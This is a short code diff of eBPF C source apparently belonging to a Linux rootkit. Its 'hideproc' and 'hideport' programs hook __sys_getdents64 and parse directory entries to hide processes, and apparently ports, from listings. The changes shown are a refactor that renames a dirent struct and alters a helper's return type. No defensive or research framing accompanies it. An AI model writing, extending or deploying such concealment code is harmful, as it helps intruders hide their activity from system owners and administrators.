@@ -528,7 +528,7 @@ int hideport_close_entry_arm64(struct pt_regs *ctx)
 #define PROC_HIDE_BUFSZ 8192
 #endif
 
-struct linux_dirent64 {
+struct hideproc_dirent64 {
     __u64 d_ino;
     __u64 d_off;
     unsigned short d_reclen;
@@ -589,15 +589,16 @@ static __always_inline int gd_name_is_pid(const char *name, __u32 *out_pid)
     return 1;
 }
 
-static __always_inline void gd_record(__s32 fd, __u64 dirp)
+static __always_inline long gd_record(__s32 fd, __u64 dirp)
 {
     __u32 key = 0;
     struct getdents_ctx *ctx = bpf_map_lookup_elem(&gd_ctx, &key);
 
     if (!ctx)
-        return;
+        return 0;
     ctx->fd = fd;
     ctx->dirp = dirp;
+    return 0;
 }
 
 SEC("kprobe/__sys_getdents64")
@@ -651,11 +652,11 @@ int hideproc_gd_ret(struct pt_regs *ctx)
         unsigned short reclen = 0;
         char name[32] = {};
 
-        if (off + sizeof(struct linux_dirent64) > (__u64)len)
+        if (off + sizeof(struct hideproc_dirent64) > (__u64)len)
             break;
         if (bpf_probe_read_kernel(&reclen, sizeof(reclen), buf + off + 16))
             break;
-        if (reclen < sizeof(struct linux_dirent64) ||
+        if (reclen < sizeof(struct hideproc_dirent64) ||
             off + reclen > (__u64)len)
             break;
         if (bpf_probe_read_kernel(&name, sizeof(name), buf + off + 19))
